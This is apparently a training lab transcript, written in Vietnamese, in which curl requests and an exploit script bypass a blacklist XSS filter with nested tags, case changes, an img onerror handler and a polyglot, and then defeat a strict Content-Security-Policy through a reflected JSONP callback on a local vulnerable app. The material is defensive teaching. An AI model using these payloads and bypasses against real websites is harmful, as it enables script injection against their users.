@@ -1,0 +1,65 @@
+# Transcript lab 3.4 - Vuot filter blacklist va CSP
+# App co lo hong: 127.0.0.1:8035 | Ngay: 2026-10-18T10:25:02Z
+
+## curl tho: filter chan payload ngay tho nhung bo lot bypass
+$ curl -s "http://127.0.0.1:8035/search?q=<script>alert(1)</script>"  (bi chan)
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>search (co filter blacklist)</title></head>
+<body><h1>search (co filter blacklist)</h1><div id=out>Tim: alert(1)</div></body></html>
+
+$ curl -s --data-urlencode "q=<scr<script>ipt>alert(1)</scr</script>ipt>" -G http://127.0.0.1:8035/search  (chen long)
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>search (co filter blacklist)</title></head>
+<body><h1>search (co filter blacklist)</h1><div id=out>Tim: <script>alert(1)</script></div></body></html>
+
+$ curl -si "http://127.0.0.1:8035/csp-strict?q=x" | grep -i content-security
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+$ curl -s "http://127.0.0.1:8035/jsonp?callback=alert(document.domain)//"  (JSONP phan chieu)
+alert(document.domain)//({"user":"admin","id":1});
+
+## exploit.py: kiem tra tu dong tat ca buoc vuot
+$ python3 exploit.py
+======================================================================
+[A] FILTER BLACKLIST ngay tho (xoa literal <script> va </script>)
+----------------------------------------------------------------------
+ A0) Payload ngay tho: <script>alert(1)</script>
+     con the <script> trong response? : KHONG
+     => filter DA CHAN payload ngay tho (dung ky vong)
+----------------------------------------------------------------------
+ A1) VUOT bang chen long: <scr<script>ipt>alert(1)</scr</script>ipt>
+     sau filter co <script>alert(1)</script> nguyen van? : CO
+     => VUOT THANH CONG (xoa mot luot nen phan con lai ghep lai thanh the that)
+----------------------------------------------------------------------
+ A2) VUOT bang doi HOA/thuong: <SCRIPT>alert(1)</SCRIPT>
+     con <SCRIPT>...</SCRIPT> nguyen van? : CO
+     => VUOT THANH CONG (filter phan biet hoa thuong)
+----------------------------------------------------------------------
+ A3) VUOT bang KHONG dung the script: <img src=x onerror=alert(1)>
+     con <img ... onerror=...> nguyen van? : CO
+     => VUOT THANH CONG (filter chi nham the script)
+----------------------------------------------------------------------
+ A4) Polyglot (chay o nhieu context):
+     payload: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//
+     phan nguy hiem con nguyen van? : CO
+======================================================================
+[B] CSP (Content-Security-Policy)
+----------------------------------------------------------------------
+ B1) /csp-inline header CSP: default-src 'self'; script-src 'self' 'unsafe-inline'
+     payload reflect nguyen van? : CO
+     PHAN TICH: co 'unsafe-inline' => inline script VA event handler van chay.
+                CSP nay KHONG bao ve duoc gi truoc XSS. => VO DUNG.
+----------------------------------------------------------------------
+ B2) /csp-strict header CSP: default-src 'self'; script-src 'self'
+     PHAN TICH: KHONG co 'unsafe-inline' => inline <script> va onerror BI CHAN.
+                Nhung 'self' cho phep nap script tu CHINH origin nay.
+     VUOT bang JSONP: /jsonp phan chieu callback vao noi dung JS.
+       $ GET /jsonp?callback=alert(document.domain)//
+       Content-Type: application/javascript; charset=utf-8
+       body        : alert(document.domain)//({"user":"admin","id":1});
+       => callback phan chieu nguyen van, content-type la JS.
+       => Ke tan cong dat: <script src="/jsonp?callback=alert(document.domain)//"></script>
+          Script nay nap tu 'self' nen HOP LE voi CSP, nhung noi dung do ke
+          tan cong dieu khien => CSP strict BI VUOT.
+======================================================================
+TONG KET: TAT CA buoc vuot deu THANH CONG
